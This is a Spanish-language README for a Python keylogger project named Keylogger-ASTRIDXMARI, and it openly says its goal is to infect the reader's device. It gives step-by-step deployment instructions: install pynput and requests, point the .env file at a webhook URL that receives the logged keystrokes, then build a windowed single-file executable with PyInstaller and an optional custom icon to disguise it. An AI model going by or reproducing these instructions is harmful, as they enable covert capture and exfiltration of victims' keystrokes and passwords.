# Keylogger-ASTRIDXMARI
Este keylogger fue creado con 1% de conocimiento y 99% fe, esperemos infectar exitosamente su dispositivo osiosi.

## Archivos adjuntos
-README.md

-.env

-Keylogger.py

## Requerimientos
-Tener instalada una versión reciente y estable de Python.

-Instalar librerías "requests", "dotenv" y "pynput". Para instalarlas ejecutar en la terminal:

    pip install requests, dotenv, pynput
    
De no reconocer el comando pip, usar:

    py -m pip install requests, dotenv, pynput

-Descargar los archivos "Keylogger" y ".env" y guardarlos en una misma carpeta. Asegurarse de que el sistema no haya convertido automáticamente el archivo .env en un archivo de texto.

## Uso
Editar el archivo .env: Esto es de suma importancia, pues actualmente solo cuenta con un placeholder. Cambiar "[URL]" por el URL del Webhook que se desea usar.
Para ejecutarlo como archivo de Python, debe ubicarse en la carpeta que contenga los archivos y ejecutar en la terminal:

    py Keylogger.py

### De querer convertirlo a un archivo ejecutable, seguir los siguientes pasos:
-Instalar (en caso no tenga instalada) la librería pyinstaller. Para ello, usar este comando:

    pip install pyinstaller

De no reconocer el comando pip, usar:

    py -m pip install pyinstaller

-Ubicarse en el directorio en donde estén los archivos .env y Keylogger.py, y ejecutar el siguiente comando en la terminal:

    pyinstaller --onefile --windowed --add-data ".env;." Keylogger.py

De no funcionar:

    python -m PyInstaller --onefile --windowed --add-data ".env;." Keylogger.py

/nota/ Si se desea añadir un icono al .exe, guardar una imagen con la extensión .ico en la misma carpeta que el resto de archivos, luego ejecutar este comando:

    pyinstaller --onefile --windowed --icon=icono.ico --add-data ".env;." Keylogger.py

De no funcionar:

    python -m PyInstaller --onefile --windowed --icon=icono.ico --add-data ".env;." Keylogger.py
